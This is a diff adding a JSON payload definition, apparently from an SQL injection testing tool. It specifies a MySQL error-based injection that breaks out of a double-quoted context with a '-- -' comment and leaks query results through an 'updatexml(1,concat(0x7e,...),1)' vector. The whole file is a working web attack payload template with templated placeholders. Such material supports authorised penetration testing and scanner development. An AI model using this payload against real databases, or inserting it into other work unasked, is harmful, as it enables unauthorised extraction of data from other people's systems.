@@ -1,0 +1,12 @@
+{
+ "dbms": "mysql",
+ "technique": "error",
+ "boundary": {
+  "prefix": "\"",
+  "suffix": "-- -",
+  "type": "double-quote",
+  "desc": "double-quoted + inline comment"
+ },
+ "vector": "{B} AND updatexml(1,concat(0x7e,({Q})),1)",
+ "comment": "mysql error via double-quoted + inline comment"
+}
